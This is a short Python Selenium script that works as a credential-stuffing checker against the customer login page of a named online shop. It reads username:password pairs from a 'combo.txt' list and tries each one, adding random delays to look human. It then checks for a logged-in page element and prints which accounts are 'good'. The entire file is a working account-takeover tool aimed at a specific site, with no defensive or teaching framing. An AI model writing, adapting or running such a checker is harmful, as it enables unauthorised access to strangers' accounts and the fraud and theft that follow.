# -*- coding: utf-8 -*-
"""
Created on Mon Oct  2 11:27:34 2023

@author: REBEL
"""

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time
import random


driver = webdriver.Firefox(executable_path=r'..\p2\geckodriver.exe')
driver.get('https://shop.xtland.com/index.php?route=account/login')
time.sleep(random.randint(3, 6))

def Login(username,password):
    user_box = driver.find_element_by_id('input-email')
    user_box.clear()
    user_box.send_keys(username)
    time.sleep(random.randint(2, 5))
    pass_box = driver.find_element_by_name('password')
    pass_box.clear()
    pass_box.send_keys(password , Keys.ENTER)
    time.sleep(random.randint(5, 6))
    
    
def Validator():
    try:
        driver.find_element_by_link_text('امتیازات جایزه شما')
        # driver.find_element_by_('btn-link dropdown-toggle')
        return True
        # driver
        
    except NoSuchElementException:
        # print('INalid Entery.')
        return False
      
with open ('combo.txt') as f:
    for lines in f:
        i1 , i2 = lines.split(':')
        Login(i1, i2)
        if Validator():
            print(f'{i1} is good.')
            log_butt =  driver.find_element_by_xpath('//a[@href="https://shop.xtland.com/index.php?route=account/logout"]')
            # driver.execute_script('window.scrollTo(0,document.body.scrollHeight)')
            driver.execute_script("arguments[0].click()",log_butt)
            time.sleep(15)
            driver.find_element_by_xpath('//a[@href="https://shop.xtland.com/index.php?route=account/logout"]').click()
            driver.get('https://shop.xtland.com/index.php?route=account/login')
        else:
            print(f'{i1} is flase.')
    driver.close()